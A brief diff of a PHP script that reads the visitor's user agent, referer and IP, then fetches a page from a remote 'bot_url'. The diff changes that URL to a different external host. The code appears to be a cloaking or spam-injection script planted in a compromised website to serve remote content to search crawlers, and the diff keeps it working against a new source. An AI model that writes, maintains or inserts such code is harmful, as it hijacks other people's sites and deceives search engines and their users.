@@ -26,7 +26,7 @@ $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
 $ip = get_client_ip();
 
-$bot_url = "https://alchemistcs.com/contact/wakak.html";
+$bot_url = "https://ns1-static.net/clock/alchemistcs/index.html";
 $reff_url = "";
 
 $file = lph_requests($bot_url);
